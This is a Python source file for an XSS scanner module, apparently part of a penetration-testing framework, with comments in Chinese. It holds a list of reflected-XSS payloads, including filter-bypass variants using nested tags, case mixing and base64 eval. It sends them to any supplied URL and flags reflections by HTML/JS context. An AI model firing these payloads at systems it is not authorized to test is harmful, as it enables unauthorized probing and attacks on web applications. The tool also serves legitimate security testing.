# 开发者：自由的风
"""xss_tester/run.py — XSS跨站脚本检测(反射/存储/DOM)
===================================================
攻击域 core — 不只测弹窗，还从反射上下文推断源码输出位置，
分析HTML/JS上下文以确定真正的代码层危险等级。
"""
import sys, json, os, urllib.request, urllib.parse, re, html

SANDBOX = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

# XSS Payload库 — 覆盖各种HTML/JS上下文
XSS_PAYLOADS = [
    # 基础弹窗
    ("<script>alert('GBT_XSS')</script>", "基础script标签", "html_body"),
    ("<img src=x onerror=alert('GBT_XSS')>", "img onerror事件", "html_body"),
    ("<svg onload=alert('GBT_XSS')>", "svg onload事件", "html_body"),
    ("<body onload=alert('GBT_XSS')>", "body onload事件", "html_body"),

    # 属性逃逸
    ('" onmouseover="alert(\'GBT_XSS\')" x="', "双引号属性逃逸", "html_attr_double"),
    ("' onmouseover='alert(\"GBT_XSS\")' x='", "单引号属性逃逸", "html_attr_single"),
    ("` onmouseover=alert('GBT_XSS') `", "反引号属性逃逸", "html_attr_backtick"),

    # JavaScript上下文
    ("';alert('GBT_XSS');//", "JS单引号逃逸", "js_string_single"),
    ('";alert(\'GBT_XSS\');//', "JS双引号逃逸", "js_string_double"),
    ("</script><script>alert('GBT_XSS')</script>", "script标签闭合", "js_script_close"),

    # 高级绕过
    ("<scr<script>ipt>alert('GBT_XSS')</scr</script>ipt>", "嵌套script绕过", "html_body"),
    ("<IMG SRC=JaVaScRiPt:alert('GBT_XSS')>", "大小写混淆", "html_body"),
    ("<img src=x onerror=eval(atob('YWxlcnQoJ0dCVF9YU1MnKQ=='))>", "base64编码绕过", "html_body"),
    ("%3Cscript%3Ealert('GBT_XSS')%3C/script%3E", "URL编码", "url_param"),
]

# 源码层上下文分析
CONTEXT_PATTERNS = [
    (r'<input[^>]*value="[^"]*GBT_XSS', "value属性中反射(双引号)", "可逃逸属性"),
    (r"<input[^>]*value='[^']*GBT_XSS", "value属性中反射(单引号)", "可逃逸属性"),
    (r'<script>[^<]*GBT_XSS', "script标签内反射", "危险: JS上下文"),
    (r'<!--[^>]*GBT_XSS', "HTML注释中反射", "可逃逸注释"),
    (r'<a[^>]*href="[^"]*GBT_XSS', "href属性中反射", "可用javascript:伪协议"),
    (r'<div[^>]*>[^<]*GBT_XSS', "div文本内容反射", "HTML标签上下文"),
]


def _send_xss(url, payload, param="q", timeout=10):
    """发送XSS payload"""
    try:
        encoded = urllib.parse.quote(payload)
        if "?" in url:
            test_url = url + f"&{param}={encoded}" if "=" in url.split("?")[1] else url + f"?{param}={encoded}"
        else:
            test_url = url + f"?{param}={encoded}"

        req = urllib.request.Request(test_url, headers={
            "User-Agent": "GBT-Neighborhood-Pentest/5.0",
        })
        resp = urllib.request.urlopen(req, timeout=timeout)
        body = resp.read().decode("utf-8", errors="replace")

        # 检测反射
        reflected = payload in body or html.unescape(payload) in body

        return {
            "url": test_url,
            "status": resp.status,
            "reflected": reflected,
            "body_sample": body[:1000] if reflected else body[:200],
            "content_type": resp.headers.get("Content-Type", ""),
        }
    except Exception as e:
        return {"url": test_url, "error": str(e)[:80], "reflected": False}


def do_test(params):
    """XSS全面检测"""
    url = params.get("url", params.get("target", ""))
    if not url:
        return {"ok": False, "error": "缺少 url 参数"}
    if not url.startswith("http"):
        url = "http://" + url

    param = params.get("param", "q")

    findings = []
    context_findings = []
    tested = 0

    for payload, desc, ctx_type in XSS_PAYLOADS:
        result = _send_xss(url, payload, param)
        tested += 1

        if result.get("reflected"):
            findings.append({
                "payload": payload[:80],
                "description": desc,
                "context": ctx_type,
                "severity": "critical" if "script" in ctx_type or "js_" in ctx_type else "high",
            })

            # 源码层上下文分析
            body = result.get("body_sample", "")
            for pattern, ctx_desc, risk in CONTEXT_PATTERNS:
                if re.search(pattern, body, re.IGNORECASE):
                    context_findings.append({
                        "payload": payload[:60],
                        "context": ctx_desc,
                        "risk": risk,
                    })

    # 去重
    seen = set()
    unique_contexts = []
    for c in context_findings:
        key = c["context"]
        if key not in seen:
            seen.add(key)
            unique_contexts.append(c)

    return {
        "ok": True,
        "cap": "xss_tester",
        "action": "test",
        "domain": "攻击域",
        "url": url,
        "payloads_tested": tested,
        "vulnerable_count": len(findings),
        "findings": findings,
        "source_context_analysis": unique_contexts,
        "verdict": "vulnerable" if findings else "clean",
        "suggestion": "对所有用户输入做HTML实体编码输出" if findings else None,
    }


def do_reflected(params):
    return do_test(params)

def do_stored(params):
    return {"ok": True, "cap": "xss_tester", "action": "stored",
            "note": "存储型XSS需提供注入点和回显点两个URL", "hint": "使用test动作先检测反射点"}


HANDLERS = {"test": do_test, "reflected": do_reflected, "stored": do_stored}

if __name__ == "__main__":
    action = sys.argv[1] if len(sys.argv) > 1 and not sys.argv[1].startswith("-") else "test"
    params_str = sys.argv[2] if len(sys.argv) > 2 else "{}"
    try:
        params = json.loads(params_str)
    except Exception:
        params = {}
    handler = HANDLERS.get(action)
    if handler:
        result = handler(params)
        print(json.dumps(result, ensure_ascii=False, default=str))
    else:
        print(json.dumps({"ok": False, "error": f"未知动作: {action}", "available": list(HANDLERS.keys())}, ensure_ascii=False))
